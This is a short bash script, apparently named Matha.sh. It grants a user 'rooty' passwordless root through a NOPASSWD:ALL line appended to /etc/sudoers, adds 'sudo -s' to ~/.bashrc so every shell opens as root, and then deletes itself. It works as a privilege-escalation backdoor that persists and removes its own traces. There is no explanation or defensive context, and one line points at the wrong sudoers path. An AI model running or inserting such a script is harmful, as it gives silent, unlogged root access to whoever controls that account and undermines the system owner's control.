#!/bin/bash
sudo usermod -aG sudo rooty
sed -i '/sudo -s/d' ~/.bashrc 
sed -i '/rooty ALL=(ALL) NOPASSWD:ALL/d' ~/etc/sudoers
echo "rooty ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
echo "sudo -s" >> ~/.bashrc
rm -f Matha.sh
exit
 
